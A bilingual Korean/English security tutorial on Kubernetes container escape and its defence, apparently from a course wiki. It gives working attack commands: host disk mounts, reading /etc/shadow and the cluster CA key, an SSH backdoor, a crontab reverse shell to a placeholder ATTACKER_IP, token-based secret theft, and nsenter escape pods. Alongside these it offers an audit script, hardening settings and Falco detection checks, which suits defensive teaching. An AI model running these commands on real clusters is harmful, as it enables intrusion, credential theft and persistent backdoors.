> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 파드 탈출 및 권한 상승

## 컨테이너 탈출이란?

컨테이너는 **격리된 샌드박스**입니다. 정상적으로는 컨테이너 안에 들어가면 바깥(호스트 노드)에 접근할 수 없어야 합니다. 그런데 잘못된 설정이 있으면 컨테이너 안에서 바깥으로 탈출할 수 있습니다.

감옥 비유: 컨테이너는 감방이고, 노드(호스트)는 교도소 전체입니다. 탈옥(컨테이너 탈출)에 성공하면 교도소 전체(클러스터)를 장악할 발판이 생깁니다.

---

## 1. 탈출 벡터 1: privileged 컨테이너

### 개념
`privileged: true` 설정은 컨테이너에게 **호스트와 동일한 커널 권한**을 부여합니다. 이 경우 컨테이너는 사실상 격리가 풀린 상태입니다.

```yaml
# 위험한 파드 설정
spec:
  containers:
  - name: dangerous
    securityContext:
      privileged: true        # ← 이것이 문제
```

### 악용 방법

privileged 컨테이너 안에서:
```bash
# 호스트의 모든 디스크 장치 목록 확인
fdisk -l

# 호스트 파일시스템을 컨테이너 안에 마운트
mkdir /host-root
mount /dev/sda1 /host-root    # 또는 mount /dev/vda1 /host-root

# 이제 호스트의 /etc/shadow 읽기 가능
cat /host-root/etc/shadow

# 호스트에 SSH 백도어 설치
cp /my-backdoor /host-root/root/.ssh/authorized_keys

# chroot로 완전히 호스트로 전환
chroot /host-root /bin/bash
```

---

## 2. 탈출 벡터 2: hostPath 마운트

### 개념
`hostPath` 볼륨은 호스트의 특정 경로를 파드 안으로 마운트합니다. `/` (루트)를 마운트하면 사실상 호스트 파일시스템 전체에 접근합니다.

```yaml
# 위험한 볼륨 마운트
spec:
  volumes:
  - name: host-root
    hostPath:
      path: /          # ← 호스트 루트 전체 마운트
  containers:
  - name: attacker
    volumeMounts:
    - name: host-root
      mountPath: /host  # 파드 내 /host에서 호스트 파일시스템 접근
```

### 악용 방법

```bash
# 파드 내부에서 호스트 파일시스템 접근
ls /host/etc/kubernetes/    # 쿠버네티스 설정 파일
cat /host/etc/kubernetes/pki/ca.key   # CA 개인키!

# 호스트의 cron에 백도어 추가
echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" \
  >> /host/etc/crontab

# kubeconfig 탈취
cat /host/root/.kube/config
```

---

## 3. 탈출 벡터 3: 서비스 계정 토큰 탈취 및 악용

### 개념
모든 파드는 기본적으로 서비스 계정 토큰을 주입받습니다. 이 토큰으로 쿠버네티스 API에 인증할 수 있습니다.

```bash
# 파드 안에서 토큰 위치
ls /var/run/secrets/kubernetes.io/serviceaccount/
# token  ca.crt  namespace
```

### 악용 방법

```bash
# 변수 설정
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://kubernetes.default.svc

# 현재 네임스페이스 확인
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# 시크릿 열거
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/default/secrets | python3 -m json.tool

# 새 파드 생성 시도 (권한 있을 경우 privileged pod 배포!)
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $API/api/v1/namespaces/default/pods \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "escape-pod"},
    "spec": {
      "hostPID": true,
      "containers": [{
        "name": "escape",
        "image": "ubuntu",
        "command": ["nsenter", "--target", "1", "--mount", "--uts",
                    "--ipc", "--net", "--pid", "--", "bash"],
        "securityContext": {"privileged": true}
      }]
    }
  }'
```

---

## 4. 탈출 벡터 4: hostPID / hostNetwork

```yaml
# hostPID: 호스트의 모든 프로세스 접근
spec:
  hostPID: true
  containers:
  - name: escape
    securityContext:
      privileged: true

# hostNetwork: 호스트 네트워크 스택 사용
spec:
  hostNetwork: true
```

```bash
# hostPID 있는 파드에서 호스트 프로세스에 nsenter
# PID 1은 호스트의 init 프로세스
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# 이제 완전히 호스트 환경에 있음
```

---

## 5. 실습: privileged pod 배포 후 노드 탈출

### 5.1 취약한 파드 배포

```bash
# privileged + hostPath 조합 (최악의 설정)
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-lab
  namespace: default
spec:
  containers:
  - name: escape
    image: ubuntu:22.04
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
  restartPolicy: Never
EOF

kubectl wait --for=condition=Ready pod/escape-lab --timeout=90s
```

### 5.2 탈출 시뮬레이션

```bash
# 파드 내부로 진입
kubectl exec -it escape-lab -- /bin/bash

# 파드 내부에서:
# 1. 호스트 파일시스템 확인
ls /host/etc/kubernetes/ 2>/dev/null || echo "K8s 설정 없음"
ls /host/root/

# 2. 호스트의 쿠버네티스 인증서 확인
ls /host/etc/kubernetes/pki/ 2>/dev/null

# 3. 호스트 디스크 확인
cat /proc/mounts | grep -v cgroup

# 4. 네트워크 네임스페이스 목록 (ip 필요)
apt-get install -y iproute2 -q 2>/dev/null
ip netns list 2>/dev/null || echo "네트워크 네임스페이스 접근 확인"

# 5. 호스트 crontab 확인
cat /host/etc/crontab 2>/dev/null

echo "[실습 완료] 실제 공격 시 여기서 백도어 설치 또는 자격증명 탈취"
```

### 5.3 탈출 탐지 및 방어 스크립트

```python
#!/usr/bin/env python3
"""
파드 보안 설정 감사 도구 — 탈출 위험 파드 탐지
사용법: python3 pod_escape_audit.py [--namespace default]
"""
import argparse
import subprocess
import json
import sys
from dataclasses import dataclass, field


@dataclass
class PodRisk:
    namespace: str
    name: str
    risks: list[str] = field(default_factory=list)

    @property
    def severity(self) -> str:
        if any("privileged" in r.lower() for r in self.risks):
            return "CRITICAL"
        if len(self.risks) >= 2:
            return "HIGH"
        return "MEDIUM"


def run_kubectl(args: list[str]) -> dict | None:
    cmd = ["kubectl"] + args + ["-o", "json"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        if result.returncode != 0:
            return None
        return json.loads(result.stdout)
    except (subprocess.TimeoutExpired, json.JSONDecodeError):
        return None


def check_pod_security(pod: dict) -> list[str]:
    """파드에서 탈출 위험 요소 탐지"""
    risks = []
    spec = pod.get("spec", {})

    # hostPID / hostNetwork / hostIPC 확인
    if spec.get("hostPID"):
        risks.append("hostPID=true: 호스트 프로세스 접근 가능")
    if spec.get("hostNetwork"):
        risks.append("hostNetwork=true: 호스트 네트워크 스택 사용")
    if spec.get("hostIPC"):
        risks.append("hostIPC=true: 호스트 IPC 공유")

    # 볼륨 확인
    for vol in spec.get("volumes", []):
        if "hostPath" in vol:
            path = vol["hostPath"].get("path", "?")
            if path in ("/", "/etc", "/var", "/root", "/proc"):
                risks.append(f"위험한 hostPath 마운트: {path}")
            elif path.startswith("/etc/kubernetes"):
                risks.append(f"K8s 설정 경로 마운트: {path}")

    # 컨테이너 보안 컨텍스트 확인
    containers = spec.get("containers", []) + spec.get("initContainers", [])
    for c in containers:
        ctx = c.get("securityContext", {})
        name = c.get("name", "unknown")

        if ctx.get("privileged"):
            risks.append(f"컨테이너 '{name}': privileged=true")
        if ctx.get("allowPrivilegeEscalation") is True:
            risks.append(f"컨테이너 '{name}': allowPrivilegeEscalation=true")
        if ctx.get("runAsUser") == 0:
            risks.append(f"컨테이너 '{name}': root(UID=0)로 실행")
        caps = ctx.get("capabilities", {})
        dangerous_caps = {"SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE", "DAC_OVERRIDE"}
        added = set(caps.get("add", [])) & dangerous_caps
        if added:
            risks.append(f"컨테이너 '{name}': 위험한 capabilities={sorted(added)}")

    return risks


def audit_pods(namespace: str | None) -> list[PodRisk]:
    args = ["get", "pods"]
    if namespace:
        args += ["-n", namespace]
    else:
        args += ["--all-namespaces"]

    data = run_kubectl(args)
    if not data:
        print("[오류] 파드 목록 조회 실패. kubectl 설정을 확인하세요.", file=sys.stderr)
        return []

    results = []
    for pod in data.get("items", []):
        meta = pod.get("metadata", {})
        risks = check_pod_security(pod)
        if risks:
            results.append(PodRisk(
                namespace=meta.get("namespace", "-"),
                name=meta.get("name", "unknown"),
                risks=risks
            ))

    return results


def main() -> None:
    parser = argparse.ArgumentParser(
        description="파드 탈출 위험 탐지 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 pod_escape_audit.py\n  python3 pod_escape_audit.py -n kube-system"
    )
    parser.add_argument(
        "--namespace", "-n", default=None,
        help="감사할 네임스페이스 (기본값: 전체)"
    )
    args = parser.parse_args()

    scope = args.namespace or "전체 네임스페이스"
    print(f"\n[*] 파드 탈출 위험 감사 — 범위: {scope}")
    print("=" * 65)

    findings = audit_pods(args.namespace)

    if not findings:
        print("[+] 탈출 위험 파드 미발견")
    else:
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
        findings.sort(key=lambda f: severity_order.get(f.severity, 9))

        print(f"발견된 위험 파드: {len(findings)}개\n")
        for pod in findings:
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(pod.severity, "⚪")
            print(f"{icon} [{pod.severity}] {pod.namespace}/{pod.name}")
            for r in pod.risks:
                print(f"    • {r}")
            print()

    print("=" * 65)
    print("[완료] 감사 종료")


if __name__ == "__main__":
    main()
```

### 5.4 정리

```bash
kubectl delete pod escape-lab
```

---

## 6. 방어 방법

```yaml
# 안전한 파드 보안 컨텍스트 설정
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      privileged: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]  # 모든 capabilities 제거
```

| 위험 설정 | 방어책 |
|---------|-------|
| `privileged: true` | `privileged: false` + capabilities drop |
| `hostPath: /` 마운트 | hostPath 사용 금지 또는 제한된 경로만 허용 |
| `hostPID: true` | 제거 |
| root로 실행 | `runAsNonRoot: true` 강제 |
| SA 토큰 자동 마운트 | `automountServiceAccountToken: false` |

### 런타임 탈출 탐지: 예방을 우회한 경우

securityContext와 PSA(Pod Security Admission)는 위험한 파드의 *생성*을 막습니다. 하지만 이미 배포된 파드나 어드미션을 우회한 워크로드에서의 탈출 *행위*는 런타임 센서(Falco, Tetragon)로만 잡힙니다.

| 런타임 신호 | 대응 탈출 벡터 | Falco 룰 개념 |
|---|---|---|
| 컨테이너 내 `mount` syscall | hostPath/디바이스 마운트 시도 | `Mount Launched in Privileged Container` |
| `/host` 또는 노드 파일시스템 접근 | hostPath `/` 마운트 악용 | 컨테이너에서 호스트 경로 쓰기 |
| `nsenter`/`setns` 호출 | 네임스페이스 탈출 | 비정상 네임스페이스 전환 |
| 컨테이너 내 셸에서 SA 토큰 읽기 | 토큰 오용 선행 행위 | `/var/run/secrets/.../token` 읽기 |
| 신규 권한 컨테이너 spawn | 탈출 후 거점 확장 | `privileged: true` 파드 생성 이벤트 |

> 다층 방어 원칙: **어드미션(예방) → 런타임(탐지) → 감사(사후 추적)** 세 계층이 모두 있어야 한다. 한 계층만으로는 0-day나 설정 누락 시 무방비가 된다. 예방 정책을 배포한 뒤에는 반드시 위 행위들을 격리 랩에서 재현해 런타임 룰이 실제로 발동하는지 검증한다.

---

<!-- detect-validate-70 -->
## 공격 탐지와 방어 검증

위에서 예방(어드미션)·탐지(런타임) 계층을 설명했다. 검증은 두 계층이 실제로 작동하는지 — 위험 파드 생성이 *거부*되고, 우회 시 탈출 행위가 *탐지*되는지 — 직접 확인하는 단계다.

### 공격 → 계층 → 통제(예방) → 탐지 신호

| 탈출 벡터 | 노리는 계층 | 1차 통제(예방) | 탐지 신호 |
|---|---|---|---|
| privileged 컨테이너 | securityContext | PSA `restricted`·OPA 거부 | Falco 권한 컨테이너 spawn |
| hostPath `/` 마운트 | 볼륨 | hostPath 차단 정책 | 컨테이너의 호스트 경로 접근 |
| hostPID/hostNetwork | 파드 스펙 | PSA `baseline` 이상 | 호스트 네임스페이스 사용 파드 |
| nsenter/setns 탈출 | 런타임 | seccomp·드롭 캡 | 비정상 네임스페이스 전환 |

### 방어 검증 (직접 확인)

```bash
# 1) 예방: 위험 파드 '생성'이 어드미션에서 거부되는지 확인
kubectl run pwn --image=busybox --privileged --restart=Never -- sleep 1d
# 통과: PSA/OPA가 'forbidden'으로 거부 / 취약: 생성되면 어드미션 미적용

# 2) 탐지: (우회 가정) 권한 파드에서 탈출 행위 시 런타임 룰이 발동하는지
kubectl exec pwn -- nsenter --target 1 --mount --uts --ipc --net --pid -- id 2>/dev/null
kubectl logs -n falco -l app=falco --since=2m | grep -i "namespace\|privileged\|escape"
# 통과: Falco에 탈출 시도 알람 1건+ → 런타임 탐지 동작
# 취약: 알람 0건이면 런타임 센서 미배포/룰 갭
```

> 검증은 반드시 **소유한 클러스터·격리 랩에서만** 수행한다. 정책을 "배포했다"가 아니라, 위험 파드 생성이 거부되고 탈출 행위가 탐지되는지 재현으로 확인해야 다층 방어가 성립한다([[68_Purple_Team]]).

**최신 기법·통제 (2025–2026):**
- privileged·hostPath·hostPID·CAP_SYS_ADMIN 컨테이너에서 노드탈출 — Pod Security Admission(restricted)·seccomp/AppArmor로 차단. 검증: 탈출 시도가 admission에서 거부되는지 재현(소유 랩)
- 커널 익스플로잇·runc/containerd CVE 기반 탈출 — 패치수준·런타임 격리(gVisor/Kata)가 실제 유효한지 확인([[29_Container_Kubernetes_Security]])

---

<a name="english"></a>

# Pod Escape and Privilege Escalation

## What Is Container Escape?

A container is an isolated sandbox. Normally, you cannot access the host node from inside. With misconfigurations, you can break out.

Think of it as a prison escape: the container is a cell, the node is the entire prison. A successful escape gives you access to the whole cluster.

---

## 1. Escape Vector 1: Privileged Containers

`privileged: true` grants the container the same kernel capabilities as the host, effectively removing isolation.

```bash
# Inside a privileged container:
mkdir /host-root
mount /dev/sda1 /host-root      # Mount host filesystem
cat /host-root/etc/shadow        # Read host password hashes
chroot /host-root /bin/bash      # Become the host
```

---

## 2. Escape Vector 2: hostPath Mount

Mounting `/` from the host into the container exposes the entire host filesystem.

```bash
# From inside a pod with hostPath: /
cat /host/etc/kubernetes/pki/ca.key   # Steal CA private key
cat /host/root/.kube/config           # Steal kubeconfig
echo "* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> /host/etc/crontab
```

---

## 3. Escape Vector 3: Service Account Token Abuse

Every pod receives a service account token by default. With sufficient RBAC permissions, this token can be used to create privileged pods.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
# Use token to query the API, create new privileged pods, steal secrets
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

---

## 4. Lab: Deploy and Escape a Privileged Pod

```bash
# Deploy vulnerable pod
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-lab
spec:
  containers:
  - name: escape
    image: ubuntu:22.04
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Enter the pod and explore host filesystem
kubectl exec -it escape-lab -- /bin/bash
ls /host/etc/kubernetes/
```

---

## 5. Defense

```yaml
# Secure pod security context
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      privileged: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
```

Use the `pod_escape_audit.py` script to automatically detect risky pod configurations across your cluster.

### Runtime Escape Detection: When Prevention Is Bypassed

securityContext and PSA (Pod Security Admission) block the *creation* of dangerous pods. But escape *behavior* in already-deployed pods or admission-bypassing workloads is caught only by runtime sensors (Falco, Tetragon).

| Runtime signal | Escape vector | Falco rule concept |
|---|---|---|
| `mount` syscall inside container | hostPath/device mount attempt | `Mount Launched in Privileged Container` |
| Access to `/host` or node filesystem | Abusing hostPath `/` mount | Container writing to host path |
| `nsenter`/`setns` call | Namespace escape | Unusual namespace switch |
| Reading SA token from a shell | Precursor to token abuse | Read of `/var/run/secrets/.../token` |
| Spawning a new privileged container | Post-escape foothold expansion | `privileged: true` pod creation event |

> Defense-in-depth principle: all three layers — **admission (prevent) → runtime (detect) → audit (post-hoc trace)** — must exist. Any single layer leaves you defenseless against a 0-day or a config gap. After deploying prevention policies, reproduce the behaviors above in an isolated lab to verify the runtime rules actually fire.

---

## Attack Detection and Defense Validation

The sections above describe the prevention (admission) and detection (runtime) layers. Validation is where you directly confirm both work — that a risky pod is *denied* and, if bypassed, the escape behavior is *detected*.

### Attack -> layer -> control (prevention) -> detection signal

| Escape vector | Target layer | Primary control (prevention) | Detection signal |
|---|---|---|---|
| Privileged container | securityContext | PSA `restricted`, OPA deny | Falco privileged-container spawn |
| hostPath `/` mount | Volume | hostPath-blocking policy | Container accessing host paths |
| hostPID/hostNetwork | Pod spec | PSA `baseline`+ | Pod using host namespaces |
| nsenter/setns escape | Runtime | seccomp, dropped caps | Abnormal namespace switch |

### Defense validation (verify yourself)

```bash
# 1) Prevention: confirm a risky pod is denied at admission
kubectl run pwn --image=busybox --privileged --restart=Never -- sleep 1d
# Pass: PSA/OPA rejects it as 'forbidden' / Weak: if it's created, admission isn't enforced

# 2) Detection: (assume bypass) does a runtime rule fire on escape behavior?
kubectl exec pwn -- nsenter --target 1 --mount --uts --ipc --net --pid -- id 2>/dev/null
kubectl logs -n falco -l app=falco --since=2m | grep -i "namespace\|privileged\|escape"
# Pass: >= 1 escape-attempt alert in Falco -> runtime detection works
# Weak: 0 alerts means the runtime sensor isn't deployed / a rule gap
```

> Run validation only on **clusters you own, in an isolated lab**. Confirm via reproduction that risky-pod creation is denied and escape behavior is detected — not merely that you "deployed" the policy — for defense-in-depth to hold (see [[68_Purple_Team]]).
